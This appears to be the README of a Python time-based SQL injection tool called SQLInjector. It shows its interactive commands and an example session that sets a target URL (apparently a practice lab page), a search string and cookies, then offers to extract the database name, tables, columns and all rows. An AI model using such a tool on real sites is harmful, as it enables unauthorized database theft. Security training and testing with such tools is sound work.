### SQLInjector

### usage
```
python3 models.py
method: time
>>>> show options
>>>> set <method domain cookies str suffix> <value>
>>>> run
```
### example
```
>>>> set method time
>>>> set domian http://xxx.xxx.xxx.xxx/sqli_15.php?title
>>>> set str World War Z
>>>> set suffix &action=search
>>>> set cookie {"xxx":"xxx","xxxx":"xxx"}
>>>> run
"***************************\n"
"* please choose your need *\n"
"* 1.get dbname            *\n"
"* 2.get all table         *\n"
"* 3.get table columns     *\n"
"* 4.get table all elems   *\n"
"* 0.exit                  *\n"
"***************************\n"
>>>> 1
DBname: xxxxx
```
